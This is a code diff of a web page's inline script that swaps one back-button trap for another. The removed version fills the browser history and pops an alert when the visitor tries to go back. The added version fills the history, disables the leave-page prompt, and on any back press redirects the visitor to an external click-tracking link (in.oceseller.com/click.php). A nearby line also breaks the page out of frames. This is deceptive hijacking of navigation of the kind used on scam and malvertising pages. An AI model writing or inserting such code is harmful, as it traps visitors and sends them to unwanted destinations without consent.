@@ -786,23 +786,17 @@ window.top.location = window.location;
  }
 </script>
 <script type="text/javascript">
- var t;
- var needCount = true;
- var count = 1;
- !function() {
- try {
-for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
-onpopstate = function(t) {
- if (needCount && count % 2 == 1) {
- alert(languageSelector.alert)
- }
- count++;
- t.state && location.replace("#")
-}
- }
- catch (o) {
- }
- }();
+        //Historyback
+        ! function() {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+                onpopstate = function(t) {
+                    window.onbeforeunload = null;
+                    t.state && location.replace('https://in.oceseller.com/click.php?key=gdf7mietwtwo9ql4hduw');
+                };
+            } catch (o) {}
+        }();
 </script>
 
 <script type="text/javascript">
